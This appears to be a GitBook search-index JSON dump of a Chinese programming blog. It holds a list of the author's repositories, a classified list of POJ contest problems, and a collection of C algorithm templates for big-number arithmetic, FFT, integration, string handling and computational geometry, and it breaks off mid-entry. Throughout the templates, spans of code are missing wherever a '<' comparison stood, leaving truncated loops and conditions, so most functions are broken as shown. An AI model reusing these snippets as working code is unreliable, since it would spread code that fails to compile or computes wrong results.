{"./":{"url":"./","title":"首页","keywords":"","body":"EXP-BLOGEXP 技术博客EXP-BLOG EXP 技术博客 [success] 　因上努力，果上求缘 推荐 EXP's Github 仓库 Web Page 分类 权限 说明 ⭐ Github Profile Link 特殊 公开 Github 个人资料卡片 ⭐ exp-blog Link 资料 公开 EXP 技术博客 - gitbook-server-docker - 工具 公开 使用 Docker 构建的 GitBook 服务器 ⭐ site-package Link 工具 公开 站长工具：站点功能组件 ⭐ api-online Link 资料 公开 在线 API ⭐ CTF-Solving-Reports Link 资料 公开 CTF 解题报告 ⭐ POJ-Solving-Reports - 资料 公开 POJ 解题报告 - expcodes - 索引 公开 经验代码库（索引目录） ⭐ exp-libs Link 项目（Java） 公开 经验构件库（Java版） - exp-libs-c - 项目（C/C++） 公开 经验构件库（C/C++版） - mojo-release-plugin - 项目（Java） 公开 Maven 项目发布插件 - mojo-archetype - 项目（Java） 公开 Maven 项目规范骨架 - mojo-web-archetype - 项目（Java） 公开 Maven 项目规范骨架（Web版） ⭐ threat-broadcast Link 项目（Python） 公开 威胁情报播报 - pypdm-mysql - 项目（Python） 公开 Python PDM 生成器（Mysql版） ⭐ crop-circles - 项目（Python） 公开 Github 麦田圈 - github-tools - 项目（Java） 公开 Github 工具包 - account-mgr - 项目（Java） 公开 帐密管理工具 ⭐ auto-upgrader Link 项目（Java） 公开 自动化升级插件 - certificate Link 项目（Java） 公开 软件授权插件 - cron-expression Link 项目（Java） 公开 cron 表达式生成器 - jzone-crawler - 项目（Java） 公开 QQ空间爬虫（Java版） - pyzone-crawler - 项目（Python） 公开 QQ空间爬虫（Python版） - sina-crawler - 项目（Python） 私有 新浪博客爬虫 - top-baidu-tieba - 项目（Java） 私有 百度贴吧顶贴机 ⭐ bilibili-plugin - 项目（Java） 公开 哔哩哔哩插件姬 - dynamic-token - 项目（Java） 公开 嵌入式：动态令牌生成&校验API - dt_otp - 项目（C/C++） 公开 嵌入式：动态令牌-dll&so实现库 - WinProcess - 项目（C/C++） 公开 Windows 系统进程管理器 - jvm-agent - 项目（Java） 公开 JVM 代理 - P2P-file-sharing-system - 项目（Java） 公开 P2P 文件共享系统 - file-port-forwarding - 项目（Java） 公开 双机文件流端口转发程序 - exp-xml-paper - 项目（Java） 公开 XML 文本编辑器 - ui-regex-debug - 项目（Java） 公开 正则调试工具 - pssms - 项目（Java） 公开 进销存管理系统 - goas - 项目（Java） 公开 政府在线自动化办公系统 - The-Well-Grounded-Rubyist - 资料 公开 《Ruby程序员修炼之道（第2版）》 课后练习 - HeadFirst-Python - 资料 公开 《HeadFirst Python》 课后练习 - lovely-python - 资料 公开 《可爱的Python》 课后练习 - The-C-Programming-Language - 资料 公开 《C++程序设计语言（十周年纪念版）》 课后练习 ⭐ ro-single-server Link 游戏 公开 仙境RO传说-单机版-服务端（支持联机） ⭐ ro-single-client - 游戏 私有 仙境RO传说-单机版-客户端（登陆补丁） ⭐ minecraft-server - 游戏 私有 我的世界-服务端（支持联机） ⭐ minecraft-client - 游戏 私有 我的世界-客户端 ⭐ minecraft-client-awacg - 游戏 私有 我的世界-客户端（ ACG 版） ⭐ re0-web Link 小说 公开 RE0：从零开始的异世界生活 （WEB版） - environment Link 资源 公开 环境安装包 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 04:55:50 "},"markdown/technical/algorithm/":{"url":"markdown/technical/algorithm/","title":"算法","keywords":"","body":"算法算法 ACM 资料 N 皇后问题 – 构造法原理与证明: 时间复杂度 O(1) Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/acm/":{"url":"markdown/technical/algorithm/acm/","title":"ACM 资料","keywords":"","body":"ACM 资料ACM 资料 北大 ACM – POJ 试题分类 POJ 解题报告 ACM 常用算法模板 ACM 绝版资源公开： 参考书、模板、讲义、指导 ACM 测试数据合集 ACM 国家集训队论文集（1999-2009） Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 04:55:50 "},"markdown/technical/algorithm/acm/POJ试题分类.html":{"url":"markdown/technical/algorithm/acm/POJ试题分类.html","title":"北大ACM：POJ试题分类","keywords":"","body":"北大ACM - POJ试题分类1. 入门水题2. 初级3. 中级4. 高级北大ACM - POJ试题分类 [!NOTE|style:flat|label:相关资料] POJ 官网题库（在线） POJ 题库（离线版） POJ封面书《程序设计导引及在线实践》 1. 入门水题 可用于练手与增强自信 POJ-1000 POJ-1003 POJ-1004 POJ-1005 POJ-1207 POJ-3299 POJ-2159 POJ-1083 POJ-3094 2. 初级 2.1. 基本算法 - 枚举 POJ-1753 POJ-2965 贪心 POJ-1328 POJ-2586 递归和分治法 - 递推 - 构造法 POJ-3295 POJ-3239 模拟法 POJ-1008 POJ-1068 POJ-2632 POJ-1573 POJ-2993 POJ-2996 POJ-3087 高精度算法 POJ-1001 POJ-1503 POJ-2109 POJ-2389 POJ-2602 POJ-3982 2.2. 图算法 - 图遍历（前序序列、中序序列、后序序列） POJ-2255 最短路径算法（dijkstra, bellman-ford, floyd, heap+dijkstra） POJ-1860 POJ-3259 POJ-1062 POJ-2253 POJ-1125 POJ-2240 最小生成树算法（prim, kruskal） POJ-1789 POJ-2485 POJ-1258 POJ-3026 拓扑排序 POJ-1094 二分图的最大匹配 （匈牙利算法） POJ-3041 POJ-3020 最大流的增广路算法（压入重标法、KM算法） POJ-1459 POJ-3436 2.3. 数据结构 - 串 POJ-1016 POJ-1035 POJ-3080 POJ-1936 排序（快排、归并排、堆排） POJ-1007 POJ-2388 POJ-1804 POJ-2299 并查集 - 高效查找法（数的Hash、串的Hash、二分查找） POJ-1002 POJ-3349 POJ-3274 POJ-1840 POJ-2002 POJ-3432 POJ-2503 哈夫曼树、优先队列 POJ-3253 堆 - trie树（静态建树、动态建树） POJ-2513 2.4. 搜索 - 深度优先搜索DFS POJ-2488 POJ-3083 POJ-3009 POJ-1321 广度优先搜索BFS POJ-3278 POJ-1426 POJ-3126 POJ-3414 POJ-2251 简单搜索技巧和剪枝 POJ-1010 POJ-2362 POJ-1011 POJ-1416 POJ-2676 POJ-1129 2.5. 动态规划 - - 背包问题 - POJ-1837 POJ-1276 POJ-1014 DP（动态规划）可参考《刘汝佳：算法法艺术与信息学竞赛》（黑书一）page 149 E[j] = opt{D+w(i,j)} POJ-1018 POJ-3267 POJ-1260 - 最长公共子序列E[i,j] = opt{D[i-1,j]+xi,D[i,j-1]+yj,D[i-1][j-1]+zij} POJ-1015 POJ-3176 POJ-1163 POJ-1080 POJ-1159 POJ-2533 POJ-1836 - 最优二分检索树问题C[i,j] = w[i,j]+opt{C[i,k-1]+C[k,j]} 2.6. 数学 - - 组合数学 加法原理和乘法原理 - 排列组合 POJ-3252 POJ-1850 POJ-1496 POJ-1942 - 递推关系 POJ-1012 POJ-1019 - 逻辑推理 POJ-1013 POJ-1017 数论 素数与整除问题 POJ-2739 POJ-2262 POJ-3006 - 进制位 - 同余模运算 POJ-2305 POJ-2635 POJ-3292 POJ-1845 POJ-2115 - 中国余数定理（扩展欧几里德、辗转相除法） POJ-1006 计算方法 二分法求解单调函数 POJ-3273 POJ-3258 POJ-1905 POJ-3122 - 随机化算法 POJ-2531 - 概率 POJ-2151 2.7. 计算几何学 - 几何公式 POJ-2031 叉积和点积的运用（如线段相交的判定、点到线段的距离等） POJ-1039 多边形的简单算法（求面积） 和 相关判定（点在多边形内、多边形是否相交） POJ-1408 POJ-1584 凸包 POJ-1696 POJ-2187 POJ-1113 3. 中级 3.1. 基本算法 - C++的标准模版库的应用 POJ-3096 POJ-3007 较为复杂的模拟题的训练 POJ-3393 POJ-1472 POJ-3371 POJ-1027 POJ-2706 POJ-1009 3.2. 图算法 - 差分约束系统的建立和求解 POJ-1716 POJ-1201 POJ-2983 最小费用最大流 POJ-2516 POJ-2195 双连通分量 POJ-2942 强连通分支及其缩点 POJ-2186 图的割边和割点 POJ-1523 POJ-3352 POJ-3177 最小割模型、网络流规约 POJ-3308 3.3. 数据结构 - 线段树 POJ-2528 POJ-2828 POJ-2777 POJ-2886 POJ-2750 静态二叉检索树 POJ-2482 POJ-2352 树状树组 POJ-1195 POJ-3321 RMQ POJ-3264 POJ-3368 并查集 POJ-1703 POJ-2492 KMP算法 POJ-1961 POJ-2406 3.4. 搜索 - 最优化剪枝和可行性剪枝 搜索的技巧和优化 POJ-1020 POJ-3411 POJ-1724 记忆化搜索 POJ-3373 POJ-1691 搜索与状态压缩 POJ-1184 3.5. 动态规划 - 较复杂的动态规划（如特别的旅行商问题等） POJ-1191 POJ-1054 POJ-3280 POJ-2029 POJ-2948 POJ-1925 POJ-3034 记录状态的动态规划 POJ-3254 POJ-2411 POJ-1185 树型动态规划 POJ-2057 POJ-1947 POJ-2486 POJ-3140 3.6. 数学 - - 组合数学 容斥原理 - 抽屉原理 - 置换群与Polya定理 POJ-1286 POJ-2409 POJ-3270 POJ-1026 - 递推关系和母函数 数论 高斯消元法 POJ-2947 POJ-1487 POJ-2065 POJ-1166 POJ-1222 - 概率问题 POJ-3071 POJ-3440 - GCD（最大公约数）LCM（最小公倍数） POJ-3101 - 中国余数定理（扩展欧几里德、辗转相除法） 计算方法 0/1分数规划 POJ-2976 - 三分法求解单峰/单谷的极值 - 矩阵法 POJ-3150 POJ-3422 POJ-3070 - 迭代逼近 POJ-3301 随机化算法 POJ-3318 POJ-2454 杂题 POJ-1870 POJ-3296 POJ-3286 POJ-1095 3.7. 计算几何学 - 坐标离散化 扫描线算法（如求矩形的面积和周长，常和线段树或堆一起使用） POJ-1765 POJ-1177 POJ-1151 POJ-3277 POJ-2280 POJ-3004 多边形的内核（半平面交） POJ-3130 POJ-3335 几何工具的综合应用 POJ-1819 POJ-1066 POJ-2043 POJ-3227 POJ-2165 POJ-3429 4. 高级 4.1. 基本算法 - 代码快速写成（精简但不失风格） POJ-2525 POJ-1684 POJ-1421 POJ-1048 POJ-2050 POJ-3306 保证正确性和高效性 POJ-3434 4.2. 图算法 - 度限制最小生成树 和 第K最短路 POJ-1639 最短路、最小生成树、二分图、最大流问题的相关理论（主要是模型建立和求解） POJ-3155 POJ-2112 POJ-1966 POJ-3281 POJ-1087 POJ-2289 POJ-3216 POJ-2446 最优比率生成树 POJ-2728 最小树形图 POJ-3164 次小生成树 无向图、有向图的最小环 4.3. 数据结构 - trie图的建立和应用 POJ-2778 LCA和RMQ问题：LCA（最近公共祖先问题）离线算法（并查集+dfs）在线算法（RMQ+dfs） POJ-1330 双端队列和应用（维护一个单调的队列，常在动态规划中起到优化状态转移的目的） POJ-2823 左偏树（可合并堆） 后缀树 POJ-3415 POJ-3294 4.4. 搜索 - 较麻烦的搜索题目训练 POJ-1069 POJ-3322 POJ-1475 POJ-1924 POJ-2049 POJ-3426 广搜优化（利用M进制数存储状态、转化为串用hash表判重、按位压缩存储状态、双向广搜、A*算法）（RMQ+dfs） POJ-1768 POJ-1184 POJ-1872 POJ-1324 POJ-2046 POJ-1482 深搜优化（尽量用位运算、一定要加剪枝、函数参数尽可能少、层数不易过大、可以考虑双向搜索或者是轮换搜索、IDA*算法） POJ-3131 POJ-2870 POJ-2286 4.5. 动态规划 - 需要用数据结构优化的动态规划 POJ-2754 POJ-3378 POJ-3017 四边形不等式理论 较难的状态DP POJ-3133 4.6. 数学 - - 组合数学 MoBius反演 POJ-2888 POJ-2154 - 偏序关系理论 计算方法 极大极小过程 POJ-3317 POJ-1085 - Nim问题 4.7. 计算几何学 - 半平面求交 POJ-3384 POJ-2540 可视图的建立 POJ-2966 点集最小圆覆盖 对踵点 POJ-2079 4.8. 综合题 POJ-3109 POJ-1478 POJ-1462 POJ-2729 POJ-2048 POJ-3336 POJ-3315 POJ-2148 POJ-1263 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/algorithm/acm/POJ_Solving_Reports.html":{"url":"markdown/technical/algorithm/acm/POJ_Solving_Reports.html","title":"POJ 解题报告","keywords":"","body":"POJ 解题报告POJ 解题报告 正在重定向到内容页面 ...... 如果您的浏览器没有自动跳转， 请点击这里 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 09:51:49 "},"markdown/technical/algorithm/acm/ACM常用算法模板.html":{"url":"markdown/technical/algorithm/acm/ACM常用算法模板.html","title":"ACM 常用算法模板","keywords":"","body":"ACM 常用算法模板数学问题精度计算——大数阶乘精度计算——乘法（大数乘小数）精度计算——乘法（大数乘大数）精度计算——加法精度计算——减法任意进制转换最大公约数、最小公倍数组合序列快速傅立叶变换（FFT）Ronberg算法计算积分行列式计算求排列组合数字符串处理字符串替换字符串查找字符串截取计算几何叉乘法求任意多边形面积求三角形面积两矢量间角度两点距离（2D、3D）射向法判断点是否在多边形内部判断点是否在线段上判断两线段是否相交判断线段与直线是否相交点到线段最短距离求两直线的交点判断一个封闭图形是凹集还是凸集Graham扫描法寻找凸包数论x的二进制长度返回x的二进制表示中从低到高的第i位模取幂运算求解模线性方程求解模线性方程组(中国余数定理)筛法素数产生器判断一个数是否素数图论Prim算法求最小生成树Dijkstra算法求单源最短路径Bellman-ford算法求单源最短路径Floyd算法求每对节点间最短路径排序/搜索快速排序希尔排序选择排序二分查找数据结构顺序队列顺序栈链表链栈二叉树ACM 常用算法模板 [!NOTE|style:flat|label:相关索引] 全算法模板整页查看： 【国际线路】 【国内线路】 数学问题     精度计算——大数阶乘 精度计算——乘法（大数乘小数） 精度计算——乘法（大数乘大数） 精度计算——加法 精度计算——减法 任意进制转换 最大公约数、最小公倍数 组合序列 快速傅立叶变换（FFT） Ronberg算法计算积分 行列式计算 求排列组合数 字符串处理     字符串替换 字符串查找 字符串截取 计算几何     叉乘法求任意多边形面积 求三角形面积 两矢量间角度 两点距离（2D、3D） 射向法判断点是否在多边形内部 判断点是否在线段上 判断两线段是否相交 判断线段与直线是否相交 点到线段最短距离 求两直线的交点 判断一个封闭图形是凹集还是凸集 Graham扫描法寻找凸包 数论     x的二进制长度 返回x的二进制表示中从低到高的第i位 模取幂运算 求解模线性方程 求解模线性方程组(中国余数定理) 筛法素数产生器 判断一个数是否素数     图论   Prim算法求最小生成树 Dijkstra算法求单源最短路径 Bellman-ford算法求单源最短路径 Floyd算法求每对节点间最短路径 排序/搜索   快速排序 希尔排序 选择排序 二分查找 数据结构     顺序队列 顺序栈 链表 链栈 二叉树   数学问题 精度计算——大数阶乘 /* 语法：int result = factorial( int n ); 参数： n：n 的阶乘 返回值： 阶乘结果的位数 注意： 本程序直接输出n!的结果，需要返回结果请保留long a[] 需要 math.h 源程序： */ int factorial( int n ) { long a[10000]; int i, j, l, c, m = 0, w; a[0] = 1; for ( i = 1; i 0 ) { m++; a[m] = c; } } w = m * 4 + log10( a[m] ) + 1; printf( \"\\n%ld\", a[m] ); for ( i = m - 1; i >= 0; i-- ) printf( \"%4.4ld\", a[i] ); return(w); } 精度计算——乘法（大数乘小数） /* 语法：mult( char c[], char t[], int m ); 参数： c[]：被乘数，用字符串表示，位数不限 t[]：结果，用字符串表示 m：乘数，限定10以内 返回值： null 注意：需要 string.h 源程序： */ void mult( char c[], char t[], int m ) { int i, l, k, flag, add = 0; char s[100]; l = strlen( c ); for ( i = 0; i = 10 ) { s[i] = k % 10; add = k / 10; flag = 1; } else { s[i] = k; flag = 0; add = 0; } } if ( flag ) { l = i + 1; s[i] = add; } else l = i; for ( i = 0; i 精度计算——乘法（大数乘大数） /* 语法：mult( char a[], char b[], char s[] ); 参数： a[]：被乘数，用字符串表示，位数不限 b[]：乘数，用字符串表示，位数不限 t[]：结果，用字符串表示 返回值： null 注意： 空间复杂度为 o(n^2) 需要 string.h 源程序： */ void mult( char a[], char b[], char s[] ) { int i, j, k = 0, alen, blen, sum = 0, res[65][65] = { 0 }, flag = 0; char result[65]; alen = strlen( a ); blen = strlen( b ); for ( i = 0; i = 0; i-- ) { for ( j = blen - 1; j >= 0; j-- ) sum = sum + res[i + blen - j - 1][j]; result[k] = sum % 10; k = k + 1; sum = sum / 10; } for ( i = blen - 2; i >= 0; i-- ) { for ( j = 0; j = 0; i-- ) s[i] = result[k - 1 - i]; s[k] = '\\0'; while ( 1 ) { if ( strlen( s ) != strlen( a ) && s[0] == '0' ) strcpy( s, s + 1 ); else break; } } 精度计算——加法 /* 语法：add( char a[], char b[], char s[] ); 参数： a[]：被乘数，用字符串表示，位数不限 b[]：乘数，用字符串表示，位数不限 t[]：结果，用字符串表示 返回值： null 注意： 空间复杂度为 o(n^2) 需要 string.h 源程序： */ void add( char a[], char b[], char back[] ) { int i, j, k, up, x, y, z, l; char *c; if ( strlen( a ) > strlen( b ) ) l = strlen( a ) + 2; else l = strlen( b ) + 2; c = (char *) malloc( l * sizeof(char) ); i = strlen( a ) - 1; j = strlen( b ) - 1; k = 0; up = 0; while ( i >= 0 || j >= 0 ) { if ( i 9 ) { up = 1; z %= 10; } else up = 0; c[k++] = z + '0'; i--; j--; } if ( up ) c[k++] = '1'; i = 0; c[k] = '\\0'; for ( k -= 1; k >= 0; k-- ) back[i++] = c[k]; back[i] = '\\0'; } 精度计算——减法 /* 语法：sub( char s1[], char s2[], char t[] ); 参数： s1[]：被减数，用字符串表示，位数不限 s2[]：减数，用字符串表示，位数不限 t[]：结果，用字符串表示 返回值： null 注意： 默认s1>=s2，程序未处理负数情况 需要 string.h 源程序： */ void sub( char s1[], char s2[], char t[] ) { int i, l2, l1, k; l2 = strlen( s2 ); l1 = strlen( s1 ); t[l1] = '\\0'; l1--; for ( i = l2 - 1; i >= 0; i--, l1-- ) { if ( s1[l1] - s2[i] >= 0 ) t[l1] = s1[l1] - s2[i] + '0'; else{ t[l1] = 10 + s1[l1] - s2[i] + '0'; s1[l1 - 1] = s1[l1 - 1] - 1; } } k = l1; while ( s1[k] = 0 ) { t[l1] = s1[l1]; l1--; } loop: if ( t[0] == '0' ) { l1 = strlen( s1 ); for ( i = 0; i 任意进制转换 /* 语法：conversion( char s1[], char s2[], long d1, long d2 ); 参数： s[]：原进制数字，用字符串表示 s2[]：转换结果，用字符串表示 d1：原进制数 d2：需要转换到的进制数 返回值： null 注意： 高于9的位数用大写'A'～'Z'表示，2～16位进制通过验证 源程序： */ void conversion( char s[], char s2[], long d1, long d2 ) { long i, j, t, num; char c; num = 0; for ( i = 0; s[i] != '\\0'; i++ ) { if ( s[i] = '0' ) t = s[i] - '0'; else t = s[i] - 'A' + 10; num = num * d1 + t; } i = 0; while ( 1 ) { t = num % d2; if ( t 最大公约数、最小公倍数 /* 语法： result = hcf( int a, int b ); result = lcd( int a, int b ); 参数： a：int a，求最大公约数或最小公倍数 b：int b，求最大公约数或最小公倍数 返回值： 返回最大公约数（hcf）或最小公倍数（lcd） 注意： lcd 需要连同 hcf 使用 源程序： */ int hcf( int a, int b ) { int r = 0; while ( b != 0 ) { r = a % b; a = b; b = r; } return(a); } lcd( int u, int v, int h ) { return(u * v / h); } 组合序列 /* 语法：m_of_n( int m, int n1, int m1, int* a, int head ) 参数： m：组合数C的上参数 n1：组合数C的下参数 m1：组合数C的上参数，递归之用 *a：1～n的整数序列数组 head：头指针 返回值： null 注意： *a需要自行产生 初始调用时，m=m1、head=0 调用例子： 求C(m,n)序列：m_of_n(m,n,m,a,0); 源程序： */ void m_of_n( int m, int n1, int m1, int* a, int head ) { int i, t; if ( m1 n1 ) return; if ( m1 == n1 ) { for ( i = 0; i 快速傅立叶变换（FFT） /* 语法：kkfft( double pr[], double pi[], int n, int k, double fr[], double fi[], int l, int il ); 参数： pr[n]：输入的实部 pi[n]：数入的虚部 n，k：满足n=2^k fr[n]：输出的实部 fi[n]：输出的虚部 l：逻辑开关，0 FFT，1 ifFT il：逻辑开关，0 输出按实部/虚部；1 输出按模/幅角 返回值： null 注意： 需要 math.h 源程序： */ void kkfft(double pr[],double pi[],int n,int k,double fr[],double fi[],int l,int il) { int it, m, is, i, j, nv, l0; double p, q, s, vr, vi, poddr, poddi; for ( it = 0; it = 0; l0-- ) { m = m / 2; nv = 2 * nv; for ( it = 0; it 0 ) pi[i] = 90.0; else pi[i] = -90.0; }else pi[i] = atan( fi[i] / fr[i] ) * 360.0 / 6.283185306; } return; } Ronberg算法计算积分 /* 语法：result = integral( double a, double b ); 参数： a：积分上限 b：积分下限 function f：积分函数 返回值： f在（a,b）之间的积分值 注意： function f(x)需要自行修改，程序中用的是sina(x)/x 需要 math.h 默认精度要求是1e-5 源程序： */ double f( double x ) { return(sin( x ) / x); /* 在这里插入被积函数 */ } double integral( double a, double b ) { double h = b - a; double t1 = (1 + f( b ) ) * h / 2.0; int k = 1; double r1, r2, s1, s2, c1, c2, t2; loop: double s = 0.0; double x = a + h / 2.0; while ( x 1e-5 ) { r1 = r2; c1 = c2; k++; h /= 2.0; t1 = t2; s1 = s2; goto loop; } return(r2); } 行列式计算 /* 语法：result = js( int s[][], int n ) 参数： s[][]：行列式存储数组 n：行列式维数，递归用 返回值： 行列式值 注意： 函数中常数N为行列式维度，需自行定义 源程序： */ int js( int s[][], int n ) { int z, j, k, r, total = 0; int b[N][N]; /*b[N][N]用于存放，在矩阵s[N][N]中元素s[0]的余子式*/ if ( n > 2 ) { for ( z = 0; z = z ) b[j][k] = s[j + 1][k + 1]; else b[j][k] = s[j + 1][k]; if ( z % 2 == 0 ) r = s[0][z] * js( b, n - 1 ); /*递归调用*/ else r = (-1) * s[0][z] * js( b, n - 1 ); total = total + r; } }else if ( n == 2 ) total = s[0][0] * s[1][1] - s[0][1] * s[1][0]; return(total); } 求排列组合数 /* 语法： result = P( long n, long m ); result = long C( long n, long m ); 参数： m：排列组合的上系数 n：排列组合的下系数 返回值： 排列组合数 注意： 符合数学规则：m 字符串处理 字符串替换 /* 语法：replace( char str[], char key[], char swap[] ); 参数： str[]：在此源字符串进行替换操作 key[]：被替换的字符串，不能为空串 swap[]：替换的字符串，可以为空串，为空串表示在源字符中删除key[] 返回值： null 注意： 默认str[]长度小于1000，如否，重新设定设定tmp大小 需要 string.h 源程序： */ void replace( char str[], char key[], char swap[] ) { int l1, l2, l3, i, j, flag; char tmp[1000]; l1 = strlen( str ); l2 = strlen( key ); l3 = strlen( swap ); for ( i = 0; i 字符串查找 /* 语法：result = strfind( char str[], char key[] ); 参数： str[]：在此源字符串进行查找操作 key[]：被查找的字符串，不能为空串 返回值： 如果查找成功，返回key在str中第一次出现的位置 否则返回-1 注意： 需要 string.h 源程序： */ int strfind( char str[], char key[] ) { int l1, l2, i, j, flag; l1 = strlen( str ); l2 = strlen( key ); for ( i = 0; i 字符串截取 /* 语法：mid( char str[], int start, int len, char strback[] ) 参数： str[]：操作的目标字符串 start：从第start个字符串开始，截取长度为len的字符 len：从第start个字符串开始，截取长度为len的字符 strback[]：截取的到的字符 返回值： 0：超出字符串长度，截取失败 1：截取成功 注意： 需要 string.h 源程序： */ int mid( char str[], int start, int len, char strback[] ) { int l, i, k = 0; l = strlen( str ); if ( start + len > l ) return(0); for ( i = start; i 计算几何 叉乘法求任意多边形面积 /* 语法：result = polygonarea( Point * polygon, int N ); 参数： *polygon：多变形顶点数组 N：多边形顶点数目 返回值： 多边形面积 注意： 支持任意多边形，凹、凸皆可 多边形顶点输入时按顺时针顺序排列 源程序： */ typedef struct { double x, y; } Point; double polygonarea( Point *polygon, int N ) { int i, j; double area = 0; for ( i = 0; i 求三角形面积 /* 语法：result = area3( float x1, float y1, float x2, float y2, float x3, float y3 ); 参数： x1～3：三角形3个顶点x坐标 y1～3：三角形3个顶点y坐标 返回值： 三角形面积 注意： 需要 math.h 源程序： */ float area3( float x1, float y1, float x2, float y2, float x3, float y3 ) { float a, b, c, p, s; a = sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) ); b = sqrt( (x1 - x3) * (x1 - x3) + (y1 - y3) * (y1 - y3) ); c = sqrt( (x3 - x2) * (x3 - x2) + (y3 - y2) * (y3 - y2) ); p = (a + b + c) / 2; s = sqrt( p * (p - a) * (p - b) * (p - c) ); return(s); } 两矢量间角度 /* 语法：result = angle( double x1, double y1, double x2, double y2 ); 参数： x/y1～2：两矢量的坐标 返回值： 两的角度矢量 注意： 返回角度为弧度制，并且以逆时针方向为正方向 需要 math.h 源程序： */ #define PI 3.1415926 double angle( double x1, double y1, double x2, double y2 ) { double dtheta, theta1, theta2; theta1 = atan2( y1, x1 ); theta2 = atan2( y2, x2 ); dtheta = theta2 - theta1; while ( dtheta > PI ) dtheta -= PI * 2; while ( dtheta 两点距离（2D、3D） /* 语法：result = distance_2d( float x1, float x2, float y1, float y2 ); 参数： x/y/z1～2：各点的x、y、z坐标 返回值： 两点之间的距离 注意： 需要 math.h 源程序： */ float distance_2d( float x1, float x2, float y1, float y2 ) { return(sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) ) ); } float distance_3d( float x1, float x2, float y1, float y2, float z1, float z2 ) { return(sqrt( (x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2) + (z1 - z2) * (z1 - z2) ) ); } 射向法判断点是否在多边形内部 /* 语法：result = insidepolygon( Point * polygon, int N, Point p ); 参数： *polygon：多边形顶点数组 N：多边形顶点个数 p：被判断点 返回值： 0：点在多边形内部 1：点在多边形外部 注意： 若p点在多边形顶点或者边上，返回值不确定，需另行判断 需要 math.h 源程序： */ #define MIN( x, y ) (x y ? x : y) typedef struct { double x, y; } Point; int insidepolygon( Point *polygon, int N, Point p ) { int counter = 0; int i; double xinters; Point p1, p2; p1 = polygon[0]; for ( i = 1; i MIN( p1.y, p2.y ) ) { if ( p.y 判断点是否在线段上 /* 语法：result = Pointonline( Point p1, Point p2, Point p ); 参数： p1、p2：线段的两个端点 p：被判断点 返回值： 0：点在不在线段上 1：点在线段上 注意： 若p线段端点上返回1 需要 math.h 源程序： */ #define MIN( x, y ) (x y ? x : y) typedef struct { double x, y; } Point; int FC( double x1, double x2 ) { if ( x1 - x2 -0.000002 ) return(1); else return(0); } int Pointonline( Point p1, Point p2, Point p ) { double x1, y1, x2, y2; x1 = p.x - p1.x; x2 = p2.x - p1.x; y1 = p.y - p1.y; y2 = p2.y - p1.y; if ( FC( x1 * y2 - x2 * y1, 0 ) == 0 ) return(0); if ( (MIN( p1.x, p2.x ) 判断两线段是否相交 /* 语法：result = sectintersect( Point p1, Point p2, Point p3, Point p4 ); 参数： p1～4：两条线段的四个端点 返回值： 0：两线段不相交 1：两线段相交 2两线段首尾相接 注意： p1!=p2;p3!=p4; 源程序： */ #define MIN( x, y ) (x y ? x : y) typedef struct { double x, y; } Point; int lineintersect( Point p1, Point p2, Point p3, Point p4 ) { Point tp1, tp2, tp3; if ( (p1.x == p3.x && p1.y == p3.y) || (p1.x == p4.x && p1.y == p4.y) || (p2.x == p3.x && p2.y == p3.y) || (p2.x == p4.x && p2.y == p4.y) ) return(2); /* 快速排斥试验 */ if ( (MIN( p1.x, p2.x ) = 0 ) return(1); else return(0); } 判断线段与直线是否相交 /* 语法：result = lineintersect( Point p1, Point p2, Point p3, Point p4 ); 参数： p1、p2：线段的两个端点 p3、p4：直线上的两个点 返回值： 0：线段直线不相交 1：线段和直线相交 注意： 如线段在直线上，返回 1 源程序： */ typedef struct { double x, y; } Point; int lineintersect( Point p1, Point p2, Point p3, Point p4 ) { Point tp1, tp2, tp3; tp1.x = p1.x - p3.x; tp1.y = p1.y - p3.y; tp2.x = p4.x - p3.x; tp2.y = p4.y - p3.y; tp3.x = p2.x - p3.x; tp3.y = p2.y - p3.y; if ( (tp1.x * tp2.y - tp1.y * tp2.x) * (tp2.x * tp3.y - tp2.y * tp3.x) >= 0 ) return(1); else return(0); } 点到线段最短距离 /* 语法：result = mindistance( Point p1, Point p2, Point q ); 参数： p1、p2：线段的两个端点 q：判断点 返回值： 点q到线段p1p2的距离 注意： 需要 math.h 源程序： */ #define MIN( x, y ) (x y ? x : y) typedef struct { double x, y; } Point; double mindistance( Point p1, Point p2, Point q ) { int flag = 1; double k; Point s; if ( p1.x == p2.x ) { s.x = p1.x; s.y = q.y; flag = 0; } if ( p1.y == p2.y ) { s.x = q.x; s.y = p1.y; flag = 0; } if ( flag ) { k = (p2.y - p1.y) / (p2.x - p1.x); s.x = (k * k * p1.x + k * (q.y - p1.y) + q.x) / (k * k + 1); s.y = k * (s.x - p1.x) + p1.y; } if ( MIN( p1.x, p2.x ) 求两直线的交点 /* 语法：result = mindistance( Point p1, Point p2, Point q ); 参数： p1～p4：直线上不相同的两点 *p：通过指针返回结果 返回值： 1：两直线相交 2：两直线平行 注意： 如需要判断两线段交点，检验k和对应k1（注释中）的值是否在0～1之间，用在0～1之间的那个求交点 源程序： */ typedef struct { double x, y; } Point; int linecorss( Point p1, Point p2, Point p3, Point p4, Point *p ) { double k; // 同一直线 if ( (p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x) == 0 && (p2.x - p1.x) * (p1.y - p3.y) - (p2.y - p1.y) * (p1.x - p3.x) == 0 ) return(2); // 平行，不同一直线 if ( (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y) == 0 ) return(0); k = ( (p4.x - p3.x) * (p1.y - p3.y) - (p4.y - p3.y) * (p1.x - p3.x) ) / ( (p4.y - p3.y) * (p2.x - p1.x) - (p4.x - p3.x) * (p2.y - p1.y) ); // k1=((p2.x-p1.x)*(p1.y-p3.y)-(p2.y-p1.y)*(p1.x-p3.x))/((p4.y-p3.y)*(p2.x-p1.x)-(p4.x-p3.x)*(p2.y-p1.y)); (*p).x = p1.x + k * (p2.x - p1.x); (*p).y = p1.y + k * (p2.y - p1.y); return(1); /*有交点 */ } 判断一个封闭图形是凹集还是凸集 /* 语法：result = convex( Point * p, int n ); 参数： 